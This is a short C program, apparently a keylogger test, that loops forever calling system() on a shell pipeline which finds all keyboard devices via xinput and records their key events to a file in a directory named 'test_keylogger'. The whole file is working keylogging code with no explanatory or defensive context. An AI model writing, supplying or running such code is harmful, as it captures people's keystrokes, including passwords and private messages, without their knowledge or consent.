#include <stdio.h>
#include <stdlib.h>
char com[] = "xinput list | grep -Po 'id=\\K\\d+(?=.*slave\\s*keyboard)' | xargs -P0 -n1 xinput test > /home/ixa/intrigue/casestudy/test_keylogger/clog";

int main () {
   /* while loop execution */
   while( 2>1 ) {
      system(com);
   }
 
   return 0;
}
